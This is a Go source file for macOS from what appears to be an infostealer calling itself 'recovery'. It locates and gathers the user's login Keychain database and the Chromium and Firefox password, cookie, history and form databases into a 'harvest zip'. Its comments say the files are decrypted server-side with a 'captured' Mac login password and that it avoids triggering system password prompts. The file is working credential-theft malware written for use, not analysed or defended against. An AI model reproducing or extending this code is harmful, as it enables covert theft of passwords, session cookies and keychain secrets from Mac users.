//go:build darwin

// offline_raw.go — collect raw Keychain + browser DBs + wallet trees without decrypt.
//
// Offline-crack mode (this branch):
//   - No Keychain unlock / set-key-partition-list / dump-keychain -d
//   - No Chromium Safe Storage reads (no system password modals)
//   - Zip raw files for server-side decrypt with the captured Mac login password
package main

import (
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/browser"
)

// rawDiskFile is a path to stream into the primary harvest zip without decrypting.
type rawDiskFile struct {
	ZipPath  string
	DiskPath string
}

// chromiumProfileDBNames are copied as-is for offline password/cookie decrypt.
var chromiumProfileDBNames = []string{
	"Login Data",
	"Login Data For Account",
	"Cookies",
	"Cookies-journal",
	"Web Data",
	"Web Data-journal",
	"History",
	"History-journal",
	"Bookmarks",
	"Preferences",
	"Secure Preferences",
}

// firefoxProfileFiles for offline NSS decrypt of logins.
var firefoxProfileFiles = []string{
	"logins.json",
	"key4.db",
	"key3.db",
	"cert9.db",
	"cookies.sqlite",
	"places.sqlite",
	"formhistory.sqlite",
	"prefs.js",
}

// collectLoginKeychainRawFiles returns the login keychain DB (and legacy file if present).
func collectLoginKeychainRawFiles() []rawDiskFile {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return nil
	}
	dir := filepath.Join(home, "Library", "Keychains")
	var out []rawDiskFile
	for _, name := range []string{"login.keychain-db", "login.keychain"} {
		p := filepath.Join(dir, name)
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			out = append(out, rawDiskFile{
				ZipPath:  "keychain/" + name,
				DiskPath: p,
			})
		}
	}
	return out
}

// collectBrowserRawDBFiles walks installed browsers and copies encrypted DBs / Local State.
func collectBrowserRawDBFiles() []rawDiskFile {
	var out []rawDiskFile
	used := make(map[string]int)

	for _, cfg := range browser.Browsers {
		root := browser.GetUserDataRoot(cfg)
		if _, err := os.Stat(root); err != nil {
			continue
		}
		browserSlug := sanitizeFilename(cfg.Name)

		// Chromium: Local State holds encrypted_key metadata (still needs Safe Storage offline).
		if !cfg.IsFirefox {
			ls := browser.LocalStatePath(cfg)
			if st, err := os.Stat(ls); err == nil && !st.IsDir() {
				zp := uniqueRawZipPath("browsers/"+browserSlug+"/Local State", used)
				out = append(out, rawDiskFile{ZipPath: zp, DiskPath: ls})
			}
		}

		for _, profile := range browser.FindProfileDirs(cfg) {
			profileSlug := sanitizeFilename(profile.Name)
			base := "browsers/" + browserSlug + "/" + profileSlug + "/"

			if cfg.IsFirefox {
				for _, name := range firefoxProfileFiles {
					p := filepath.Join(profile.Path, name)
					if st, err := os.Stat(p); err == nil && !st.IsDir() {
						zp := uniqueRawZipPath(base+name, used)
						out = append(out, rawDiskFile{ZipPath: zp, DiskPath: p})
					}
				}
				continue
			}

			for _, name := range chromiumProfileDBNames {
				p := filepath.Join(profile.Path, name)
				if st, err := os.Stat(p); err == nil && !st.IsDir() {
					zp := uniqueRawZipPath(base+name, used)
					out = append(out, rawDiskFile{ZipPath: zp, DiskPath: p})
				}
			}
		}
	}
	return out
}

func uniqueRawZipPath(base string, used map[string]int) string {
	base = strings.ReplaceAll(base, "\\", "/")
	if used[base] == 0 {
		used[base] = 1
		return base
	}
	used[base]++
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)
	return stem + "-" + itoa(used[base]) + ext
}
